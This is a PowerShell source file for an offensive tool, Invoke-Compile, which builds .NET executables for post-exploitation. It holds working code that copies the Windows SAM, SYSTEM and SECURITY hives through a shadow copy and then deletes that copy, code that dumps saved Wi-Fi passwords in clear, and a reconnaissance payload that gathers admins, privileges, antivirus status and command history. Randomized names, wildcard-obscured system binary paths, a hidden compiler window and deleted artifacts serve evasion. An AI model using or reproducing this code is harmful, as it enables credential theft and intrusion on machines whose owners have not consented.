function Invoke-Compile {
<# 

.SYNOPSIS

	Compiles some of Apex's functionality to .NET Assemblies. Executables will be written to $env:temp.
	
.PARAMETER Help
	Displays Help

.PARAMETER List

	Displays summary usage.
	
.PARAMETER CopySAM

	Compiles a .NET Assembly that can be used to copy the SAM, SYSTEM and SECURITY files for offline parsing and cracking.
	
.PARAMETER WiFiCreds

	Compiles a .NET Assembly that can be used to dump saved wireless credentials.
	
.PARAMETER SysInfo

	Compiles a .NET Assembly that gathers information about the system. Will drop a "SysInfo.exe" in $env:temp. When executed, will write results to C:\windows\temp\SysInfo.txt.

.EXAMPLE 
	
	Compile:
	PS> Invoke-Compile -CopySAM
	
	Execute:
	C:\CopySAM.exe
	
	Compile:
	PS> Invoke-Compile -SysInfo
	
	Execute:
	C:\windows\temp\SysInfo.exe

.NOTES

	Author: Fabrizio Siciliano (@0rbz_)

#>

[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[Switch]$List,
		
	[Parameter(Mandatory = $False)]
	[Switch]$CopySAM,
	
	[Parameter(Mandatory = $False)]
	[Switch]$WiFiCreds,
	
	[Parameter(Mandatory = $False)]
	[Switch]$SysInfo
	

)

$X = (-join ((65..90) + (97..122) | Get-Random -Count 11 | foreach {[char]$_}))
$Z = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
$FWDir = $([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())
$SmaDll = [PSObject].Assembly.Location
$CsFile = "$env:temp\$Z.cs"
$Compiler = "$FWDir" + "c?c.??e"


	if ($Help -eq $True) {
		Write @"

 ### Invoke-Compile Help ###
 ---------------------------
 Available Invoke-Compile Commands:
 ----------------------------------
 
 |---------------------------------------------------------------------|
 | -CopySAM                                                            |
 |---------------------------------------------------------------------| 

   [*] Description: Invoke-Creds -CopySAM functionality compiled as a
       .NET Assembly.
	
       Tested on Win 10 / .NET CLRVersion 4.0.30319.42000
	
       The resulting CopySAM.exe assembly requires admin rights to work.

   [*] Usage: Invoke-Compile -CopySam
   
   [*] Mitre ATT&CK Ref: T1003 (Credential Dumping)

 |---------------------------------------------------------------------|
 | -WiFiCreds                                                          |
 |---------------------------------------------------------------------|

   [*] Description: Invoke-Creds -WifiCreds functionality compiled as a
       .NET Assembly.
	   
       Tested on Win 10 / .NET CLRVersion 4.0.30319.42000

   [*] Usage: Invoke-Compile -WiFiCreds
   
   [*] Mitre ATT&CK Ref: T1081 (Credentials in Files)
   
 |---------------------------------------------------------------------|
 | -SysInfo                                                            |
 |---------------------------------------------------------------------|

   [*] Description: Compiles a .NET Assembly that gathers information 
       about the system. Will drop a "SysInfo.exe" in C:\windows\temp. 
       When executed, will write results to $env:temp\SysInfo.txt.
	   
   [*] Usage: Invoke-Compile -SysInfo
   
 \---------------------------------------------------------------------/
   
"@
	}
	elseif ($List -eq $True) {
		Write @"  

 Invoke-Compile Brief Command Usage:
 -----------------------------------
 Invoke-Compile -CopySAM
 Invoke-Compile -WiFiCreds
 Invoke-Compile -SysInfo

"@
	}
	elseif ($CopySAM) {
		
		$CompilerArgs = "/r:$SmaDll /t:exe /out:$env:temp\CopySAM.exe $CsFile"
		
		$Source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;
using System;
using System.IO;

namespace $Z
{
    class $Z
    {
        static void Main(string[] args)
        {
            using (PowerShell $X = PowerShell.Create().AddScript(@"
`$class = [WMICLASS]'root\cimv2:win32_shadowcopy'
`$class.create('C:\', 'ClientAccessible')
`$DeviceObjectName = (Get-WmiObject win32_shadowcopy | select -ExpandProperty DeviceObject -Last 1)
`$ShadowCopyID = (Get-WmiObject win32_shadowcopy | select -ExpandProperty ID | select -Last 1)
(C:\\windows\\system32\\cmd.exe /c copy `$DeviceObjectName\windows\system32\config\SYSTEM `$env:temp\SYSTEM)
(C:\\windows\\system32\\cmd.exe /c copy `$DeviceObjectName\windows\system32\config\SECURITY `$env:temp\SECURITY)
(C:\\windows\\system32\\cmd.exe /c copy `$DeviceObjectName\windows\system32\config\SAM `$env:temp\SAM)
(C:\\windows\\system32\\vssadmin.exe delete shadows /Shadow=`$ShadowCopyID /quiet)"))
            {
                Collection<PSObject> Output = $X.Invoke();
            }
			Environment.CurrentDirectory = Environment.GetEnvironmentVariable("temp");
			DirectoryInfo dir = new DirectoryInfo(".");
			Console.WriteLine("[+] SYSTEM, SAM and SECURITY files saved to " + dir.FullName);
        }
    }
}
"@
	
		New-Item "$env:temp\$Z.cs" -ItemType File >$null 2>&1
		Add-Content $CsFile $Source
		Start-Process -Wi Hidden -FilePath $Compiler -ArgumentList $CompilerArgs
		Sleep 4
		Remove-Item $env:temp\$Z.cs
		Write "`n [+] Assembly --> $env:temp\CopySAM.exe`n"
	}
	elseif ($WiFiCreds) {
		
		$CompilerArgs = "/r:$SmaDll /t:exe /out:$env:temp\WiFiCreds.exe $CsFile"

		$Source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;
using System;
using System.IO;

namespace $Z
{
    class $Z
    {
        static void Main(string[] args)
        {
            using (PowerShell $X = PowerShell.Create().AddScript(@"
(C:\windows\system32\netsh.exe wlan show profiles) | Select-String ""\:(.+)`$"" | %{`$name=`$_.Matches.Groups[1].Value.Trim(); `$_} | %{(netsh wlan show profile name=""`$name"" key=clear)} | Select-String ""Key Content\W+\:(.+)`$"" | %{`$pass=`$_.Matches.Groups[1].Value.Trim(); `$_} | %{[PSCustomObject]@{ ""Wireless Profile""=`$name;""Password""=`$pass }} | Format-Table -AutoSize | Out-File C:\windows\temp\$Z"))
            {
                Collection<PSObject> Output = $X.Invoke();
            }
		// Console.WriteLine("WiFi Credentials saved to C:\\windows\\temp\\$Z");
		string text = System.IO.File.ReadAllText(@"C:\\windows\\temp\\$Z");
		System.Console.WriteLine("{0}", text);
		// System.Console.ReadLine();
		System.IO.File.Delete("C:\\windows\\temp\\$Z");
        }
    }
}
"@

		New-Item "$env:temp\$Z.cs" -ItemType File >$null 2>&1
		Add-Content $CsFile $Source
		Start-Process -Wi Hidden -FilePath $Compiler -ArgumentList $CompilerArgs
		Sleep 4
		Remove-Item $env:temp\$Z.cs
		Write "`n [+] Assembly --> $env:temp\WiFiCreds.exe`n"
	}
	elseif ($SysInfo) {
		
		$CompilerArgs = "/r:$SmaDll /t:exe /out:$env:temp\SysInfo.exe $CsFile"

		$Source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;
using System;
using System.IO;

namespace $Z
{
    class $Z
    {
        static void Main(string[] args)
        {
            using (PowerShell $X = PowerShell.Create().AddScript(@"
			
Write-Output ""`n--- OS Information: ---"" | Out-File C:\windows\temp\SysInfo.txt
(get-wmiobject win32_operatingsystem | Select-Object Caption, Version, OSArchitecture, ServicePackMajorVersion, ServicePackMinorVersion, MUILanguages, LastBootUpTime, LocalDateTime, NumberOfUsers, SystemDirectory | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Environment: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(Get-ChildItem Env: | ft Key,Value | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Architecture: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(Get-WmiObject -Query ""SELECT * FROM Win32_Processor WHERE AddressWidth='64'"" | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Users: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(Get-WmiObject -Class Win32_UserAccount -Filter  ""LocalAccount='True'"" | select name, fullname | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Local Admins: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(C:\??*?\*3?\n?t.?x? localgroup Administrators | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Domain Admins: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(C:\??*?\*3?\n?t.?x? group 'Domain Admins' /domain | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Privileges: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(C:\??*?\*3?\wh??m?.?x? /priv | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- HotFixes: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(Get-Hotfix | Sort-Object -Descending | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Check Elevated: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
`$check = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match ""S-1-5-32-544"")
		if (`$check -eq `$true) {

			Write-Output "" [+] We're running as an elevated process."" | Out-File -Append C:\windows\temp\SysInfo.txt

		}
		if (`$check -eq `$false) {

			Write-Output "" [-] Not Elevated."" | Out-File -Append C:\windows\temp\SysInfo.txt
		}
		
Write-Output ""`n--- Shares/Drives: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(Get-WmiObject Win32_Share | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Logged On: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
`$Explorer = (Get-WmiObject -Query ""select * from Win32_Process where Name='explorer.exe'"")
	
		if (!`$Explorer) {

		Write "" [-] No users currently interactively logged on."" | Out-File -Append C:\windows\temp\SysInfo.txt

		}
			else {
				foreach (`$p in `$Explorer) {
				`$Username = `$p.GetOwner().User
				`$Domain = `$p.GetOwner().Domain

				Write "" User: `$Domain\`$Username`n Logon Time: `$(`$p.ConvertToDateTime(`$p.CreationDate))"" | Out-File -Append C:\windows\temp\SysInfo.txt

			}
		}
		
Write-Output ""`n--- Installed Applications: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | Format-Table Parent,Name,LastWriteTime | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Processes: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(Get-WmiObject -Query 'Select * from Win32_Process' | where {`$_.Name -notlike 'svchost*'} | Select Name, Handle, @{Label='Owner';Expression={`$_.GetOwner().User}} | Format-Table -AutoSize | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Services: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(Get-WmiObject win32_service | Select-Object Name, DisplayName, @{Name=""Path""; Expression={`$_.PathName.split('""')[1]}}, State | Format-List | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Tasks: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
(Get-ChildItem C:\windows\system32\tasks |fl -Property Name,FullName | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Installed AV: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
[parameter(ValueFromPipeline=`$true, ValueFromPipelineByPropertyName=`$true)]
	[Alias('name')]
	`$computername=`$env:computername
	`$AntiVirusProducts = Get-WmiObject -Namespace ""root\SecurityCenter2"" -Class AntiVirusProduct  -ComputerName `$computername

		`$ret = @()
		foreach(`$AntiVirusProduct in `$AntiVirusProducts){
			switch (`$AntiVirusProduct.productState) {
			""262144"" {`$defstatus = ""Up to date"" ;`$rtstatus = ""Disabled""}
			""262160"" {`$defstatus = ""Out of date"" ;`$rtstatus = ""Disabled""}
			""266240"" {`$defstatus = ""Up to date"" ;`$rtstatus = ""Enabled""}
			""266256"" {`$defstatus = ""Out of date"" ;`$rtstatus = ""Enabled""}
			""393216"" {`$defstatus = ""Up to date"" ;`$rtstatus = ""Disabled""}
			""393232"" {`$defstatus = ""Out of date"" ;`$rtstatus = ""Disabled""}
			""393488"" {`$defstatus = ""Out of date"" ;`$rtstatus = ""Disabled""}
			""397312"" {`$defstatus = ""Up to date"" ;`$rtstatus = ""Enabled""}
			""397328"" {`$defstatus = ""Out of date"" ;`$rtstatus = ""Enabled""}
			""397584"" {`$defstatus = ""Out of date"" ;`$rtstatus = ""Enabled""}
			default {`$defstatus = ""Unknown"" ;`$rtstatus = ""Unknown""}
			}
			`$ht = @{}
			`$ht.Computername = `$computername
			`$ht.Name = `$AntiVirusProduct.displayName
			`$ht.'Product GUID' = `$AntiVirusProduct.instanceGuid
			`$ht.'Product Executable' = `$AntiVirusProduct.pathToSignedProductExe
			`$ht.'Reporting Exe' = `$AntiVirusProduct.pathToSignedReportingExe
			`$ht.'Definition Status' = `$defstatus
			`$ht.'Real-time Protection Status' = `$rtstatus

			`$ret += New-Object -TypeName PSObject -Property `$ht
		}
`$ret | Out-File -Append C:\windows\temp\SysInfo.txt

Write-Output ""`n--- Local Client DNS Cache: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt
if (`$PSVersionTable.PSVersion.Major -eq ""2"") {

			Write "" [!] This function requires PowerShell version greater than 2.0."" | Out-File -Append C:\windows\temp\SysInfo.txt

			return
		}
		else {
			(Get-DnsClientCache | Out-File -Append C:\windows\temp\SysInfo.txt)
		}

Write-Output ""`n--- PowerShell ConsoleHost History: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt	
(Get-Content ""`$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"" | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Recent Documents: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt	
(Get-ChildItem `$env:appdata\Microsoft\Windows\Recent\ | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Network Interfaces: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt	
(ipconfig /all | Out-File -Append C:\windows\temp\SysInfo.txt)

Write-Output ""`n--- Network Connections: ---"" | Out-File -Append C:\windows\temp\SysInfo.txt	
(netstat -an | Out-File -Append C:\windows\temp\SysInfo.txt)

"))
            {
                Collection<PSObject> Output = $X.Invoke();
            }
		string text = System.IO.File.ReadAllText(@"C:\\windows\\temp\\SysInfo.txt");
		// System.Console.WriteLine("{0}", text);
		Console.WriteLine("SysInfo saved to C:\\windows\\temp\\SysInfo.txt");
		// System.Console.ReadLine();
		// System.IO.File.Delete("C:\\windows\\temp\\$Z");
        }
    }
}
"@

		New-Item "$env:temp\$Z.cs" -ItemType File >$null 2>&1
		Add-Content $CsFile $Source
		Start-Process -Wi Hidden -FilePath $Compiler -ArgumentList $CompilerArgs
		Sleep 4
		Remove-Item $env:temp\$Z.cs
		Write "`n [+] Assembly --> $env:temp\SysInfo.exe`n"
	}
}